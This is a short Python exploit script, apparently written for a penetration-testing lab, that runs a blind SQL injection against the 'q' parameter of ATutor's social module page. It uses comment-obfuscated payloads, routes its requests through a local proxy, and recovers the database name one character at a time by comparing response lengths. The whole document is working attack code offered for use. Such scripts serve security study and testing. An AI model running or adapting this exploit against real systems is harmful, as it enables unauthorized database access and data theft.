import requests
from bs4 import BeautifulSoup
import re
import sys

proxies = {
	'http':'http://127.0.0.1:8080',
	'https':'http://127.0.0.1:8080'
}

def dbname():

	target = "http://192.168.158.103/ATutor/mods/_standard/social/index_public.php?q=" 
	
	for i in range(0,12):
		i = i + 1
		k = str(i)
		payload = "AAA')/**/OR/**/(ascii(substr((select/**/database()),"+k+",1)))="
		for j in range(32,126):
			l = str(j)
			url = target + payload + l + "/**/%23"

			r = requests.get(url, proxies=proxies,verify=False)
			s = BeautifulSoup(r.text, 'lxml')
			t = int(r.headers['Content-Length'])

			if (t > 20):
				print("dbname chars : ", chr(j))

			#print(int(r.headers['Content-Length']))
		

dbname()